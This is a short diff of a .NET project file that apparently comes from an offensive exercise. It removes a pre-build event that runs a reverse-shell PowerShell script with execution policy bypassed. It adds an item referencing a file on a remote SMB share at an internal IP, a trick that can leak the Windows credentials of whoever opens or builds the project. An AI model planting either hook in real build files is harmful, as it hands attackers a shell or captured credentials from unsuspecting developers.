@@ -4,7 +4,8 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
-    <PreBuildEvent>PowerShell -ExecutionPolicy Bypass -File revshell.ps1</PreBuildEvent>
   </PropertyGroup>
+   <ItemGroup>
+    <None Include="\\10.10.16.41\enox\app.config" />
+  </ItemGroup>
 </Project>
-
